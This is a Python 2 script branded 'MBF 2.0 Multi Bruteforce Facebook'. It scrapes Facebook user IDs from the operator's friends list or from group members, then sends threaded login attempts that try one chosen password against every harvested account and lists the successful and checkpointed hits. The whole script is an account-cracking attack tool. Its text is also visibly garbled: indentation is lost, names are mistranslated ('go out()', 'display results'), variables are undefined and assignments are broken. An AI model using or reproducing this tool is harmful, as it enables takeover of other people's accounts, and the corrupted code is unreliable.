import platform,os,sys
def print(x,e=0):
w = 'mhkbpcP'
for i in w:
j = w.index(i)
x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
x += '\033[0m'
x = x.replace('!0','\033[0m')
if e != 0:
sys.stdout.write(x)
else:
sys.stdout.write(x+'\n')
if platform.python_version().split('.')[0] != '2':
print('!m[!] You are using python version %s please use version 2.x.x'%v().split(' ')[0])
sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
  import mechanism
except ImportError:
print('!m[!] Looks like Module !cmechanize!m is not installed yet...\n!h[!] pip2 install mechanize')
sys.exit()
br = 0
log = 0
id_bteman = []
id_bgroup = []
fid_bteman = []
fid_bgroup = []
class mt(threading.Thread):
def __init__(self,i,p):
threading.Thread.__init__(self)
self.id = i
self.a = 0
self.p = p
def update(self):
return self.a,self.id
def run(self):
try:
data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p }),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
except KeyboardInterrupt:
sys.exit()
except:
self.a = 4
sys.exit()
if 'm_sess' in data.url or 'save-device' in data.url:
self.a = 1
elif 'checkpoint' in data.url:
self.a = 2
else:
self.a = 3
def crack(d):
while 1:
s = inputD('[?] Password')
if len(s) < 6:
print('!m[!] Minimum number of letters !k6')
else:
break
return crack0(d,s)
def showresult(account,password,data):
checkpoint = []
wrong = 0
successful = []
for i in account:
st,id = i
if st == 1:
successful.append(id)
elif st == 2:
checkpoint.append(id)
elif st == 3:
false += 1
print('!h[*] Success !c%d'%len(success))
if len(success) != 0:
for i in worked:
print('!h### !p%s !m=> !b[!k%s!b]'%(i,password))
print('!k[*] Checkpoint !c%d'%len(checkpoint))
if len(checkpoint) != 0:
for i in checkpoint:
print('!k### !p%s !m=> !b[!k%s!b]'%(i,password))
print('!m[*] Failed !c'+str(false))
i = inputD('[?] Not Satisfied with Result,Want to try again (y/n)',['Y','N'])
if i.upper() == 'Y':
return crack(data)
else:
return menu()
def crack0(data,password):
account = []
print('!h[*] Cracking !k%d Account !hwith password !m[!k%s!m]'%(len(data),password))
print('!h[*] Cracking !k0!m%',1)
sys.stdout.flush()
number0,number1 = 0.0
th = []
for i in data:
i = i.replace(' ','')
i = i.replace('\n','')
if len(i) != 0:th.append(mt(i,password))
number1 += 1
for i in th:
i.daemon = True
try:i.start()
except KeyboardInterrupt:exit()
h_error = []
error = 0
while 1:
try:
for i in th:
status,id = i.update()
if status != 0:
print('\r!h[*] Cracking !k%d!m%s!0'%(int(float((float(wml0)/float(amount1))*100)),'%'),1 )
sys.stdout.flush()
del(th[th.index(i)])
if status == 4:
h_error.append(id)
if h_error.count(id) == 3:
pass
else:
th.append(mt(id,password))
th[len(th)-1].daemon = True
th[len(th)-1].start()
else:
number0 += 1
account.append((status,id))
except KeyboardInterrupt:
sys.exit()
try:
if threading.activeCount() == 1:break
except KeyboardInterrupt:
go out()
print('\r!h[*] Cracking !k100!m% ')
display results(account, password, data)
def install_browser():
global br
br = mechanism.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def readData():
global fid_bgroup,fid_bteman
try:
fid_bgroup = open(os.sys.path[0]+'/MBFgroup.txt','r').readlines()
except:pass
try:
fid_bteman = open(os.sys.path[0]+'/MBFteman.txt','r').readlines()
except:pass
def save():
if len(id_bgroup) != 0:
print('!h[*] Save result from Group')
try:
open(os.sys.path[0]+'/MBFgroup.txt','w').write('\n'.join(id_bgroup))
print('!h[!] Successfully saved !cMBFgroup.txt')
except:
print('!m[!] Failed to save')
if len(id_bfriend) != 0:
print('!h[*] Save results of Friends list...')
try:
open(os.sys.path[0]+'/MBFfriend.txt','w').write('\n'.join(id_bfriend))
print('!h[!] Successfully saved !cMBFfriend.txt')
except:
print('!m[!] Failed to save')
def exit():
save()
print('!m[!] Exit')
sys.exit()
def inputD(x,v=0):
while 1:
try:
a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
except:
print('\n!m[!] Cancel')
go out()
ifv:
if a.upper() in v:
break
else:
print('!m[!] Enter Options Bro...')
continue
else:
if len(a) == 0:
print('!m[!] Enter correctly')
continue
else:
break
return a
def inputM(x,d):
while 1:
try:
i = int(inputD(x))
except:
print('!m[!] Missing selection')
continue
if i in d:
break
else:
print('!m[!] Missing selection')
return i
def furtherG():
global fid_bgroup
if len(fid_bgroup) != 0:
i = inputD('[?] Research Results Id Group/continue (r/l)',['R','L'])
if i.upper() == 'L':
return crack(fid_bgroup)
else:
os.remove(os.sys.path[0]+'/MBFgroup.txt')
fid_bgroup = []
return 0
def furtherT():
global fid_bteman
if len(fid_bteman) != 0:
i = inputD('[?] Research Result Id Friend/continue (r/l)',['R','L'])
if i.upper() == 'L':
return crack(fid_bteman)
else:
os.remove(os.sys.path[0]+'/MBFfriend.txt')
fid_bteman = []
return 0
def open(d):
try:
x = br.open(d)
br._factory.is_html = True
x = x.read()
except:
print('\r!m[!] Failed to open !p'+str(d))
go out()
if '<link rel="redirect" href="' in x:
return open(br.find_link().url)
else:
return x
def login():
global log
us = inputD('[?] Email/HP')
pa = inputD('[?] Password')
print('!h[*] Login....')
open('https://m.facebook.com')
br.select_form(nr=0)
br.form['email']=us
br.form['pass']=pa
br.submit()
url = br.geturl()
if 'save-device' in url or 'm_sess' in url:
go to('https://mobile.facebook.com/home.php')
name = br.find_link(url_regex='logout.php').text
name = re.findall(r'\((.*a?)\)',name)[0]
print('!h[*] Welcome !k%s'%name)
print('!h[*] Hope this is your lucky day...')
log = 1
elif 'checkpoint' in url:
print('!m[!] Account got checkpoint\n!k[!]Try logging in with opera mini')
go out()
else:
print('!m[!] Login Failed')
def idgroup():
if logs != 1:
print('!h[*] Login !bFB!h first boss...')
login()
if logs == 0:
go out()
next = filter_id_group0()
while 1:
filter_id_group1(open(next))
try:
next = br.find_link(url_regex='/browse/group/members/').url
except:
print('!m[!] Can Take Only !h %d id'%len(id_bgroup))
break
save()
i = inputD('[?] Direct Crack (y/n)',['Y','T'])
if i.upper() == 'Y':
return crack(id_bgroup)
else:
return menu()
def filter_id_friend(r):
for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
id_bteman.append(i)
def friend():
if logs != 1:
print('!h[*] Login !bFB !hold boss...')
login()
if logs == 0:
go out()
print('!h[*] Collecting friend id...')
go to('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
number = br.find_link(url_regex='/friends/center/friends/').text
sum = re.findall(r'\((.*a?)\)',amount)[0]
print('!h[*] Fetches !p%s !hid friends'%amount)
filter_id_friend(open('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
try:
next = br.find_link(url_regex='friends_center_main').url
except:
if len(friend_id) != 0:
print('!m[!] Can only retrieve !p%d id'%len(id_bteman))
else:
print('!m[!] Cancel')
go out()
while 1:
filter_id_friend(open(next))
print('\r!h[*] !p%s !hid retrieved...'%len(id_bteman),1)
sys.stdout.flush()
try:
next = br.find_link(url_regex='friends_center_main').url
except:
print('\n!m[!] Can only retrieve !p%d id'%len(id_bfriend))
break
save()
i = inputD('[?] Direct Crack (y/n)',['Y','T'])
if i.upper() == 'Y':
return crack(id_bteman)
else:
return menu()
defmenu():
print("\n !h.-.-..\n /+/++//\n /+/++//\n !k* !k* !h/+/++//\n \ / |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n !h( !m'!h)!0 !h/'|'\ !b\\\n !h/ \ \ !b'\n !h\_ \_ \_ !k___!mMBF !c2.0!k___\ n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cPIRMANSX\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\ n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h TAKE !mID !h FROM..... !k|\n'======================'\n!k#!p1 !h FRIENDS LIST\n! k#!p2 !hGROUP MEMBER\n!k#!p3 !mOUT...")
i = inputM('[?] SELECT',[1,2,3])
if i == 2:
continueG()
idgroup()
elif i == 1:
continueT()
idfriend()
elif i == 3:
go out()
readData()
install_browser()
menu()
#
#
#
